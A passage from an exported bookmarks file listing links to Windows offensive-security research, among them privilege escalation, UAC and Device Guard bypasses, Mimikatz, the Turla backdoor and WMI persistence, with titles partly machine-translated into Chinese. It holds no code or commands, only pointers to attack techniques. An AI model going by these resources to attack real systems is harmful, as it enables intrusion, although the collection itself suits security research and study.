icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA3klEQVQ4jWNkgIJ/aUz/GUgATLP+MTIwMDAwkqMZ2RBGcjXDAAuGSEQPA4NFAgMDhwBC7MIGBoYlKQwMXz5gugJDs0MBqmYGBgYGgwAGhow1WF2AaoBFAoK9IAGCf0BtVXFgYJAxIOAFmM1rChgYTixBiCcsQLiEgYGB4ckFuBRqIM74g9WZGCADYS8THmVEAcxYYGCAeGHPFFQxlxwGhpAJBAz48QESDiETMKMMpvkHqjiqAScWQKKRgQERcOjgBKo4qgErSiA0ekKC2XxiAUINFFCclCnPTDAOudkZAEkvQ+XgMBz1AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Hacking Monks: Home</a><br>            <dt><a href="http://www.fuzzysecurity.com/" add_date="1515246054" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADcElEQVQ4jXWTW0xbdQDGv9P/udHb6QUKXQu0DLpabGHAGLEOlxjdHPCgMfPdhMQnfVgW9cG9GOMlxheN4cFr1C3RZVlECToJujHCtmxgWTs2LqWUW6GW03t7yjnHF/sg0e/5+31Pv4/CfyQYDBp6etp9jXZbr16rPZLO5LWrsbWVhaXotcnJqTsAlGqXOsByF9549UxfX9dZh8PRX2erten1BiLL+9jZTiiRBwvL16fufHbx+9FPE4lEHgDoKun3+81vnn/lnLu5cdjT1lKnNxgohtcBhIEiFcDShFgsgofhuAsMQ7MffDTyPoB98g9P3n37/LmjAd/rbleTwPMcRWgCihBAkSGXi5CkMlQVsJoFtlwuedJ72dvRWHyNAMBLz59p6zve/Y7Fam7YSiTDKTGzC0WxsoxGA3kfuVxeXd/Y2dxNiTtiOmMwGvTGTDa7Oj1zd4oAwNDgKf9jXs/w7zdmFj4Z+erluzOhb+psFtpiFroJ0VD37oVmro7++tqlb6+MhB89ZAhhehiuphRf3/6RBgANASdVJDIXioiRyOJiKnUrY2uwful2NQ1QFOVYXo2Pv/fhxxMA1BPB4JK7eU9psFkP2e1GnQYAivnCX7Ks5CwmwdXa2twOAKmsuFPI57O5XA7bWwkJAJxOZ2urp+mk02GnCU1Xamp4mQCAzsCUA/5Av63WelRWIGh5XiYazekOf/ug1WpiV9c2SSFfqg8Gjw13PO4bdDU7qfjGxo2b06ErNABMTNxODTw3MH68u/MpXqt90e1qfMZkErTuwy6W41l0dwVOSvvKE+5mJ+v1tFCx2Hp2ZSX+cygUylc9UH8a++Wyt83V39sdGOrqbDepqorQfAQVqQxFBfXs00Gu1mqBKKbV0P0H46Njv40DQNUDRKPxtCLLW4JJOGavr7Wl0xnMzs6DYxkUi0UcstdDVRXMhcLrn39x8a1HSyvhf5kIAJd+GJ1yu9x/tB52+TiO05x4shdGgwH5QgEcx4Hna0BoZlcGPV9lNAe+oEqVkmg2m8HxvEpRlGoUjNDrdIitbSgsy6rJZFLKJ5NcFaAPDJCHi6ubs3P3FxeXo4JULnFnXxgSZv8Ml77+7nK0w+9buH7z1tXlzc2d/3sjAOj8Xm9LrlxwCQbjkY5OX724J0bHxienK5VKDIAIQK2W/wbiNWqF0HJ43wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">FuzzySecurity | 家</a><br>            <dt><a href="https://attack.mitre.org/wiki/Privilege_Escalation" add_date="1515574108" target="_blank" rel="noopener">特权升级 - 企业</a><br>            <dt><a href="https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/" add_date="1515633340" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADFUlEQVQ4jYWSTWxUZRiFn/feO52/9hLtD5R0lEowmpIWGloiGEpryo9G2Gk1mpjIRiNSYzDRJQsbibppXBgl2JAYoGiiZTGmwhQ6/qA02lrtDE07BhwppRRbmf7M3HtfF3egS9/kW5wvOec77zmf6P3UACAoHiZBujFYB7hI8RaCXt44fnDr3h9qH29vPPx25ymUGQS1CPErCoACQo5y9B6iKI7heO+2pIdz8djD07ZNfF64CSC6CkUAr0hoRrFR9XyoIniO6hcL9abz2ods3bKZ9Gh6qvujI/viffGfLZ5Diw78aQSNYKCoAmKqZG+jg+Pt2kpY84sLbsvOx9ZcvdpxKN4Xf8GiyX+o6AMsVFwfOS5iBtH0eEhKvxvQlOkwkXrQyFyfdg3HKwOw1L4XISqgTYiWAq5/pBoRq6DLf4TZuaFGKlfbbtabDHz67dAkgCV7/MAUMCgSKYJVkOgPMrX4Pmv3R7nwyzGtkxKzzK4ev3E+/QGAFGZQFRD1czy6YHDdBSOial4slXbZr/1JWFezm7qmCs1MzNH39YnLm+qXTs+OTX1s7Zk37zaFKqRwWQyCm0KO5nfrI1ts+Sb5vXpWSEeGNunvo7+ZjfWB5o6OWHNX1/K/1ph517MvYN7cTMSy8a4ZGgtbnDuX1qGko3tbZ41wNMGZzy7/6RSqbyQvinPlyq2ElMcPef4GnoLFbOotNLdGCDlaNTdCZeaENg+elkjESnuREseezZV/fl/5S9eGRvsBFbp05R8IEADTcFXEFOOvMT2yoavwfGs0cPiNS+8kL2T/7j7e0pOdyY8dfPWrOkCtCK4iRQVPafvJdO0505oxEoXt29+TbetDKqUVWoiWZLfti9VWrg0Rqy17tLNzx8mzZyfetJ5NmB4g6peBvSzWYqSHHU8dCzz5dAMF17DOnErnv+wdHjzwcuOLl36cXtq4saqwa1fsmfl5Z728/sTKCgosuYVPJkvahh+ozTvLd8IaDBbMTObO7YGBkZPRaNXqXC4fhn8UcBsaHorIK216oEgWFPdWBT29vbJSzf/Mf7zra1hIGLvrAAAAAElFTkSuQmCC" target="_blank" rel="noopener">逃避微软的AutoRuns - 有意识的黑客</a><br>            <dt><a href="https://msitpros.com/?p=3960" add_date="1515747710" target="_blank" rel="noopener">CMSTP.exe - MSitPros博客的研究</a><br>            <dt><a href="https://www.proofpoint.com/us/threat-insight/post/turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack" add_date="1515747725" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACX0lEQVQ4jU2RTYiOYRSG7/O8z/u+3/eRZjFMk5+aZIENKfkpiykWFiwsSFlIShYWVhQLNSkrYkFWQspmKAtJ/pIiSU0zzaT8zWSMmWTm+53nOec8x2JM2V93d1cXHTp/tR2Ccy4li8wGVMsissyHCKDIfa1SJjMAZpb7zKtwYk6gssj7VvU4ok/jP3u7u7ZuXJc5N/x5fPjzeLUsARjMpeRVWFVC5NU9K6+cPqopPXz5bu/OLdWyMDMiuv/0zc3BJ9WySMnIklMRFVGVpAqAiA70bx/9OnHv8atvk78AHNy9c9fm9XONhpmqilNhFVZmFTGDI3rxfujEwLXLdwdPXboxOfMbwJ5tm0xVmBPz4oNwUiECgOfvPkJ1RdeyH1Mzb4fGAKzuWV4r8xiCqngRFo7CrCIAADRbbUsawryZNpotAD7LYIk5Zg5emZVZOKrIgmVvd9efP7Olz9rN5pre5QBm6416vUFEGtmpsCirsCoTEYAj+/bs2LwhJTm0t3/Hpo0APoyMzdXrSCrC/zoocxIBkFJaUq3cvnSu1elUy9I593t27s6Dx0VGHIP3mROOwlE4qDAA59zF67cePXtdKYr5ED8Mjx4/O/B1YiIj4xiEoxdhkcjCsig9NT1z7MyF9Wv7iOjH1LTBapVKCAEwR+ZFhFmERUQ0pcw556hS5D+nZ1S1KHKAQoxEMDNH5BciqMSkkjkHwFRjDLVKYQTmCAMA/BvAz3c67Xbbkn35Pn7y3EDmso8jo6babLbMFtgFHsks5ULb9h9utTuZc6LaaLVgWLqklnv/P734gCL3fwHUNbPQZOBmGAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Turla APT演员刷新KopiLuwak JavaScript后门，用于G20主题攻击 Proofpoint的</a><br>            <dt><a href="https://offsec.provadys.com/UAC-bypass-dotnet.html" add_date="1515747740" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB2UlEQVQ4jW2Tu4oUURCGv//02fbCOItoYqJgIo5oIgbCgi9gZmDoK5iIL7BPIIKIRj6Cz2BiJAobeEvU3WC8I7OD033Ob1C9uzOyBU1VV9df9delZbuAZYQ8h/4jlB2gh+Ys5ItYjagg2UgABgQY11rtartW/7xdvX3E3qb6C/ZOa0+v2rPHdl3YtcQTANuuGbAtIaPuDag1o7vQXDBpDJ5D/wG6l7jdEAaBbSQtMai2PZ3YX6/5UCl/7Pnz0Hb1AEsAIARGNi5AMe6hdoReQBpB/xl2Hw0kKsgMCQinUbwkQQNqQBlI4ArNGZg/Q/7r8C0lWJGYNLgEA3pQAv+CbgvKp4gx5FWkD8ASaG2wM9TvMHsA6RSk0+BoJONloIIqQJnC4kVU7t/D7Cl072B9E6eTkguQyGiZcgaVsLtX8OPWPjGaMaxvwug+woYkJDJ4uCtBOgpeLLUgGN2D9gbkS5DPBfW9eJscRgUaaCbQbw1BNUofuwNrkwC5REtxSiCR4oPjDtrrkE4QOx4WVH/HJtwN61wddjZCKbmCUnvFlNdYjUTn/Q0oA+VgVkMawDl8UgLTXBbtTbT7BGYPhcZR9XAJ5N7vHCZJ9Zvp38YNpOOQzoe2/2cgwP8AshYzA5eLWnMAAAAASUVORK5CYII=" target="_blank" rel="noopener">Provadys进攻安全博客</a><br>            <dt><a href="https://stolenbytes.com/?p=32" add_date="1515747755" target="_blank" rel="noopener">APC for the WIN(dows) – stolenbytes</a><br>            <dt><a href="https://tyranidslair.blogspot.co.uk/2017/08/the-art-of-becoming-trustedinstaller.html" add_date="1515747761" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA3klEQVQ4jWNkgIJ/aUz/GUgATLP+MTIwMDAwkqMZ2RBGcjXDAAuGSEQPA4NFAgMDhwBC7MIGBoYlKQwMXz5gugJDs0MBqmYGBgYGgwAGhow1WF2AaoBFAoK9IAGCf0BtVXFgYJAxIOAFmM1rChgYTixBiCcsQLiEgYGB4ckFuBRqIM74g9WZGCADYS8THmVEAcxYYGCAeGHPFFQxlxwGhpAJBAz48QESDiETMKMMpvkHqjiqAScWQKKRgQERcOjgBKo4qgErSiA0ekKC2XxiAUINFFCclCnPTDAOudkZAEkvQ+XgMBz1AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Tyranid&#39;s Lair: The Art of Becoming TrustedInstaller</a><br>            <dt><a href="http://www.cnblogs.com/backlion/p/7908563.html" add_date="1515750675" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAChklEQVQ4jX2TT2hUVxTGf+fe95LJNPOKJtjGqIgJtZIukjwmeY1ORbpxpW4tiC22qHQdcdFd11Jw5UIFEVEsdd1/CmLoJEynBIIuZDbqC52ITGIn/zrOu8eFbyRq4re899zv/r5zOMJ7VIhGTonYrwGjqtfvTU7+9HaNXeedAbQQRWfEmrPq9DzwtzFmfHtvb/fjOL4DSKtY1jFgYGCgc3MQPKTZPHqvVLoLkM8PDnbYzB8v6vXdxfv3a2t/e0dBEHyIQG15uZxS2lJpekaFZYLg07dxbRiG/trDYrFYFdXqplzuByABki9GR8cBtc6dGO3vD1q1XhiGnRnf/xK4tSZW4px+Z635pTAW7RXEqdOtou6G8bzvpavrHJXKA0BMuVx+bmH/WD4/uJZiYmqqXKsvDiFcQd3Np/Pzw07MJ57ndSqErQQegIOnxvNOAydTAgVkZmZmHrgIUBgZOSIih51ziRgZA64CagBckvwu6KEwDLtf+UFq4gFE0fAe49kL1hijqlZV82n/nAH4q1T6B1HN+v6x9KItNWkWwmi4zbTf9nzvoxdJ87JzSclaO1AYGupqTcEACU5+BU6lBI18Pv/xvij60babOyJSW1ltHJ0oTp1I1F0yYjKura2PFmLah599z35T+HxkXMW0C3ymKksJfFtfWv5zenp6AZBkpfFbkrUJRncBkzbNyjaYlVzugIg5jrIXaBehjtPNGd/v692xVZ88mY3janVhx/begwapPopnJ14TFON4hTjeH4bhB7nV1aSeydiORsNoEDTn5uYalUrl/zSuqnIN2PlGhFbTyuXyczaWA1hZ+O9WRxB8Bch62yhssGQt/fvs2eKWnp5aNputvwS6tfe4Ri+BiwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">windows下载执行命令大全 - 渗透测试中心 - 博客园</a><br>            <dt><a href="http://blogs.microsoft.co.il/pavely/2017/08/07/hooking-com-classes/" add_date="1515820651" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAATklEQVQ4jWNgoBAwvgrS+I9LktMnjuGwFQPD8UcLcRrARKkLRg2gggGM////xxmNxAAWvQW3cUrGaAkwFPNNZvj3YDZONQMfBqMGMDAAAK4vEERZduhrAAAAAElFTkSuQmCC" target="_blank" rel="noopener">钩住COM类| 帕维尔的博客</a><br>            <dt><a href="https://evi1cg.me/Archive.html" add_date="1515820711" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACqUlEQVQ4jU2RX0yNcRzGn+/39/ae3uP0OhWhk4QlVIjTkC5sSnNB1DUz48bM1oyZrfl3yYULLvyZYcZ0E2ozTEdFRJYZa8txyr9qOYrTqvec3t/v5+LEPFfPxWef5+KhaxfPMEsCWHDCcY+dOjc4NMzMWmv8DREppZYWLDxycA+zkESkAI9pPmnt+J/WWv8rAHo/9veE+5mJABDgum5PbzjpS0JMZBgiSTORUjoc+coAAQA0M3stC4CUSjADqFhXWLoslwCiacvA90EmJH0AkZQKQPWmUiEYwOKc2euK8jXAzAoagN9vs4YmIg0SQizIzQZQtXFVTUUpgNDbvtot5RuKFrmuZBAIweJiUVNdCQAEJdW8eVmtz7uGf0+ePHWgKFhw+Oj+kg2ry8tWt7S9Ho7+Cq4p3lZZLnZUVzJARFJK/0zba5l3m1ps21tfX+fLSJtUPD93hSPHO569qTuwO8PnE7XJBYCYEvHE8kV5o+NOuPtdft6c+QVLx0ZGheF2dXaXFBYW5OU4E3FRs61SA9BKKc1MPssKBLIDaSljA0PX77eWrS3raH8WHxlfGAgkHIeZWUODILyWafsU8dWGpguXbuZk+fft3P429HxNadXIQCzTnxmPO0REBAZIOIlvrZ1fmkOvLt950Phoru2pqViPKXnr7CFTyeamRyYTT98FplRzKvLZvnR77GZjycv39SlWrG/ww9DPsVgs02uFrp6YMRJ92tCUmmFP3w9Bv8Jf0mEIy8emZ4nhmTMUvfK4S+UvC0d/zMry763bNRl60XGtwTUEAJbxKf3pmwAypY7oqd+uu9nwRm7ca2zvXrm11lwe9JQEyZOKh23Dkc8pHpPlhJMyGpMs0oniWk0ArGk7W8cPnjh++rydlv2guaXXcWaSEf06wIbxBxteKCEbaXmVAAAAAElFTkSuQmCC" target="_blank" rel="noopener">Archive - Evi1cg&#39;s blog</a><br>            <dt><a href="http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html" add_date="1515824263" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAvklEQVQ4jbWSMQ6DMAxFTVWxeEh2C67BniMwIuV6jFwj4hZkYIfJEsJNByRAKRlQ27/Z+V/2U5yFEOCOHrfcAPCM6nme+74fxxEAiKiqKqXU2ZCdV5qmqeu6ZVn2Tp7ndV1rra9Xcs4xMxFZa621RMTMzrkkg/deRIwxiIiIxhgRGYYhycDMAICIW4mIIiIi1wxt226snyKipmniCd77S3f0dATWdU0FzvoiEMH9bMLxD2VZvhIqimK3ZX+/1jcI2nERw8v6MQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">利用星期一：用.NET程序集编译方法绕过设备保护</a><br>            <dt><a href="http://phrack.org/papers/dotnet_instrumentation.html" add_date="1515825187" target="_blank" rel="noopener">.:: Phrack Magazine ::.</a><br>            <dt><a href="https://docs.microsoft.com/en-us/powershell/scripting/getting-started/cookbooks/changing-computer-state?view=powershell-5.1" add_date="1516076494" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAQklEQVQ4jWP87if3nwEH4Nz0iLF+FwNO+UY3BkYmXJLEglEDqGAAxYCRYcl7nPHMECPI+H8n7nTA6D6aDgaHARQDAKgRDRsLiHU6AAAAAElFTkSuQmCC" target="_blank" rel="noopener">更改计算机状态| Microsoft Docs</a><br>            <dt><a href="https://habrahabr.ru/company/pm/blog/328008/" add_date="1516115865" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABh0lEQVQ4jWVSvWoUURg9587Mzs7iRiPRIqIgiJWdFmJlm9IH8AnyAHkYCyGlD5AmYGdASGWjhUHFQgJLIFmYnZ2Z+x2Lb2Z2dG9xuX/nOz/f5dHxiSSSPpMEJEECie2RAhheR7OmjSQnaUJC4jYmhRcEotm8yB/f363q9uLySpLfDOUcEBwQAus2Pri78/b18zcvn2VJABECh9detAO4bj+VZKZotlo3Vd2O7TkmdZzkjAQQZfMif7p/r4l28WcRzcJIVQdwhSRIzov88ODVzmwK4Pz77w9nX/qiIhnGCRAEcGua36zWPy6vALx48vDR3p26jf+YHoYgAMtV9e708/uP5zdlJamYTExyg1sASVK5bprW2mirugEgGUnv6th0l5pJfW6bbUc/7oOnloSQhFBkXZUiS/3k/1h9kyZhsSzPvv68LiszA/Dp26/bs+liWaZJGGLl0fHJQBLN6iYyME8TAOs2yjTJkoFk85cGSbNp6MICiiwFIWHc742k3jt9AUAk1K97hr8IogarssvBrgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">UAC Bypass или история о трех эскалациях / Блог компании Перспективный мониторинг / Хабрахабр</a><br>            <dt><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/" add_date="1516414055" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Putting data in Alternate data streams and how to execute it – Oddvar Moe&#39;s Blog</a><br>            <dt><a href="https://homjxi0e.wordpress.com/" add_date="1516501499" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJ0lEQVQ4jYWQzUtUYRSHn/Pej3FgSGpZiwpa1aaozajQpmgbwQj9AWGE6WhQKUm3yJIg/KikRS2iEHIW7opqMVY60ipaKK0qCAoMCUIr773ve1qM1lSjneU5nOc8vwO/KjIAdFcucua1o2u6v9pWwzpVM4wcAEozOMH4vXRO9RKJWw9SM1ABwOkFbPIN1JLJ9lOc7iYSR2Hc+w9AFFQYbn5OnB5DjEeaJAThNTqn2ii12nqQv9REKYx7jDSNkSYd+EGAswlBOErxxdF6EKkbLFJDJI6uylmCzBVs6hBJiOMjjLQ8rMYVrWOwChBHFBkGmwZIflxCxKIaEIZjFCfzK8uyNgBgdmfVbrC5D5uWMT6oNiLhHaKyDyiAX3e5MO5RarWcKOdoyA5gaMHGlkzO8GPxDbOfdY0fqFR74mgv7yOTvYUX7sUlIAZcep35rz3cO7S0uuH/eVUsoJx6eRK4jJBDHah8IlnuYrjlQc1hrTGIDESO9iebCTcM4fkFbKL4GSFdfkoct3Fj/7t/bUV/R+icPIifHcXzd2ATQGKs62MofxVUKMw0QKNl43fly1uh1BqvGKjQXTmN+AMAeAG4ZA6bHCcO5gjdfdCtQApqULF4nsHaCYby54Xi9G6MeYUIKAp6m+WlHm4eWKBYOUxu0wQ2rVWHIAuL8x/50Ljdh/g9Gj7DC/eQph0M5u9W36KG2ZnHbFk4hzHbcC5BxAMcNvZQHlHaFf8ETzjpcD4LhIgAAAAASUVORK5CYII=" target="_blank" rel="noopener">matthomjxi0e - 博客研究</a><br>            <dt><a href="http://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/" add_date="1517450221" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACr0lEQVQ4jUVSO0vzUAC9j6Q3CUFJAmotVhqKDupQHEQtBEUq4iS61T/g5Cr+Ah110FEHxxZdLDh1qK9BQQoRrIqlRETbK0WMjXldh/Dxneksh8N5QMMwAAAQQtd1NU37+vqilEqSJEkSY8z3fQAAQgghBCEMw5BjjCGEPM9TVTWbzaqqKsvyzc3NxcWF7/sTExOKokQcYwwh5CCEkcb3/Waz6bouAGBlZcVxnKmpqVqt1t/fL8sypRQhBAD47+A4jmEYQRB8fHzoup7JZBRFgRAODQ3puv729kYICcMQIYSCIJBleXZ29ufn5/f3l+O4w8PDsbEx0zQzmczZ2dnS0pLneRBCAADn+36n09ne3uY4TlGURqNRKBRub28fHh4opbqur6+v7+zsRKEZYziZTK6trTmOUyqVUqnU5uam4ziqqr6/v7++vvb19SWTyfPzc4xxq9UihKDx8XHbtsvl8urq6v7+vuM4EELP8wRBIIQMDAwcHx/n8/mRkRFN0zzPw/F43Pf9XC5Xr9d7enq+v78ppTzPB0EgSdLd3Z1hGISQWq02PDz8+PiIKKWVSuX+/t6yrOnp6UajgTGOxmq1WgihdDp9cHCwuLhYr9cZYwhj3N3dXSwW5+fnNU3r6uoSBMF13U6ns7y8fHR0FI/HNzY2np+fr6+vCSFwZmam3W4vLCxMTk5alsXzvCRJV1dX1Wp1bm5OFEUAAMb45OSEMQYhRIwxURSr1Wpvb69pmul0+uXlZWtra3d3N5fLZbNZ27b39vYghNEOeHBwkOO4z8/PRCKBEFJVlVIai8VOT0/L5bLneZeXlzzPg3/AqVQqeockSbIsl0ol0zRt287n87quPz09hWFoWRYhBADAGIPRvYMgEARBFMVmsxm1FIvFEonE6OhopVJpt9scx0UOf4HjUqlDewG6AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Windows特权升级指南</a><br>            <dt><a href="https://astr0baby.wordpress.com/2018/01/30/running-latest-x64-mimikatz-on-windows-10/amp/" add_date="1517452327" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACdElEQVQ4jW3SyU8TYRjH8eeddzqlQ0s3UtraLSyCLA1E1IaYaOJ69uRFPXjRePRi4sE/QP0PDBfhhAdJlBixQYWwlBBKKlANbenG0ukytGVoZ3u9NIKE7+05fE7PD8iJZFkOTk3muf3nTx5NfZwgZ0XDibLp5Iex0ZZm9PDeXa3VBkAAEPwfIoT8O9TtMEgSpNZIewA1t5C9KPbfPgUosVZbmpwQeQ6ICkiDOofBPYi8vdDqItwuUaQkFwuufSpVCg2wNjMdDi1k5r4QAoSiAIAwTbIsA8hiKZcXhFCm9O5rcDkeaQBH7wCqK/MLK5V0DBV3FElcn52OLv0EPiF4vOPrK8GVcQtbzVaX4kUOAPDrN29XQ4v8UQ0fFNqkrEbctXU5reggtxGedV4NLb9XdHO5HHNYZTDgfm83hTF+/PKVp9vPFYqb2bJk6hIlg6B3C/6b0TJtcsL5oTaXP8FrPq+mxgCAAgCM8citG6nkfrYgZMIbTOcVg3eguleqJqZTvzORxQSfESt5UZSLRK03/uDw+jovtH+bDV/2e9D8KDk67JVps7gaq0XKmdqL+09TfAG2UrVfMw1AZHm4vpfUxtVDF3i6QSxjqf4s8CBv66/wQvnHVh/LuNyDTM/1BkA0bRy5po9+b3W3AasDMFMOn2Y7SW/FdUi1a+mqCoxvBDNNx9PY0TR7Ony02UpYPdKxYDRpnJLVdKe6viFYHKyrz9B1CQCOgflch2UoABQGQKRJB9y+uvkH53m0m7crRKkhOAUsTp+SsQPPA1+GuigXSulYVtLbse8itjsNA4EzxkekupqOSAc5UVQkrVHn7mGttlPj+wuWVFFQvrBZfgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">在Windows 10上运行最新的x64 Mimikatz - Astr0baby不是那么随意的想法。</a><br>            <dt><a href="https://osandamalith.com/" add_date="1518432178" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACv0lEQVQ4jQXBbU9TZxgA4Pt+3s5LTykt57SAgAmiOJZlbMuM+sF3hajbD9iy37aQZePTvowsuu2DSpQZwkw0AkYraKVogba8nfb0POd57l0XPm40CUxX2JxQyfN3C3PzrXbDZejlB0ZPT3x752p+/ITVlnc1SHnIrCAgBOCATNP8r/P/PXpULPU5HGduT3uSLfz8y+fnv/m4vd361AwGowt3Z4RBYkQe8ePGXv1drVIZmvzsdLvZWHv1cjgsH2/X78+t9TKjguDc+GhfzhOGAWhbcPz3b7fig/i7W7NhVHy89LCTxNXNqsMFl/Li5Uvnb14PxkZiMIwIHKn0/tFfv/9xe/bO5avXorC83z7kmnJODqVCxx2emixNnWkbbYAxRiCQ/bNw7+NGbXp6Wnn+yPDY5KkzPoiil/O5QqKeNUdZishVxplA1os7L5afFYO+56urcZK0dlsb1U10OQkgmzmABT+HQIDALTEiozyvUCxUq2+MzYhocXFxd6ch+nOHtqspS3pJ3I0JwYA1nIQBq1154ea1Zw8fLPw212p8skaPhf0FFWzutZWBIIy8wXJmrSLUCEwQSotDpXCoHFqd9I7ir7/8arBSOWi1k7gLhobL5fHRMUwztAQMmAToNZpL9/4O+4ul0oDppq9eridZttPcLQRBsdBX39h88uf9PHGOYMEw11MvVlY2VtelI89+MfXDTz+WyuVmfBRVIs+RYEylf2B9aWX16YqvHAJiqbVBPi+VTDMtAtcp5UfOngqikpDSZJkBssYUuPN+7bVOUwBgqc5OTky4Ob/TOQ4Hw66w0fjI7Pd3Pdc3mkAIAyQtuowjIiIyICZ9j3nKlXJrq/Zg+cl+2ql9qFljXcc1jBmGYEF3UjKAxBhaYkqFUWTTTAp5ZebGQfd4+em/9XqdcS49hylHOe7ezl6vlzIU/wOO11ybuVZcUAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Os博客Osanda | 安全研究与逆向工程</a><br>            <dt><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf" add_date="1518432343" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACcUlEQVQ4jTWSPW+TdxTFz733/yS2cWycOChASOSGACGAoEJ9GUrXFjYEYmRoP0AHvke/QVWpc1tVqjpQVYiBgRcJgYBUJE2CYxs7iQkYv8bPc08Hw9l+0hl+0jlSKE4LFKoiIqIAIaJqakFVLQRVE4FaIOlJHEBQAHcCQJzKZI/ML07PzKra22ajXt0c9HsWAjlUVREEAqCTTGUOfHbpyuKZi2OptAhUTVU9STZWnz28+1e/25YoolPyk0XSpw4d+eba9wdyB0c9NftgokEEvW7n9q8/7dS31ILkC1PpbO7qzR8y2byIdDut11vrpIMYS6XnF05nsjkA/V7nt59/7Lx/a+Op9KVvrx86PCciavbPH788vX+nvLZSXl/Z+PcJwbmFJYiohXyh+PLZo5A7OFU6cU7VIAKw/e6NWRSiSFQ88dqrVZIABZgtnSwUZ2zp/Jfzx0+L6pvdxoM7f9YrGxbMQmRmALrt1natnM5kc4Ui6a29puYnp0UVwH6/W/5vxZOYBACIiIi7l9eeN7dr7g4iXyja4vKnM7MlVZ3IT569+FVl42W/11ZVEO5++Ngn1767dXTuOAAAze2adtstfIhYCMcWTn0chqSXTpwJ0ZjTSSfYbu2FRnVTVQEBQGJ/0DcLIgJA1XbrFbpzhCLVzVV9/67ZqL1SFYD1yvpwf6BmGiI1E5HBoLf24nGv0xZgp17ZbVSldHJ5Ijf59eUb9/7+vV7dFBGzIKoQ0D2J4ySJo2h86fwXO/WtvWZDli98Phzuk4zj4UhDVEdKJJMkcXfQR5eJxsZDZmIiiZM4Hrq7ACRJQACCoLuTFEBVzYJF4X/pJi87KkUvgwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent Asynchronous-And-Fileless-Backdoor-wp.pdf</a><br>            <dt><a 